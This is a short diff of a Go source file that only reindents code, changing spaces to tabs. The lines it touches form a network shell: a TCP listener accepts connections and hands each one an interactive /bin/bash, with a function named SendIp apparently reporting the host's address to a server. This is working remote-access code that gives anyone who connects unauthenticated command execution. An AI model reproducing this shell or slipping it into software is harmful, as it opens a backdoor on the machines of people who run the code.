@@ -14,10 +14,10 @@ func handleConnection(connection net.Conn, addr string) {
 		command = "/bin/bash"
 	}
 	cmd := exec.Command(command)
-    cmd.Stdin = connection
-    cmd.Stdout = connection
-    cmd.Stderr = connection
-    cmd.Run()
+	cmd.Stdin = connection
+	cmd.Stdout = connection
+	cmd.Stderr = connection
+	cmd.Run()
 }
 
 func SendIp(serverIp string) {
@@ -28,13 +28,13 @@ func Listen(addr string) {
 	listener, err := net.Listen("tcp", addr)
 	if err != nil {
 		return
-    }
+	}
 	for {
-        connection, err := listener.Accept()
-        if err == nil {
+		connection, err := listener.Accept()
+		if err == nil {
 			go handleConnection(connection,addr) 
-        }
-    }
+		}
+	}
 
 }
 
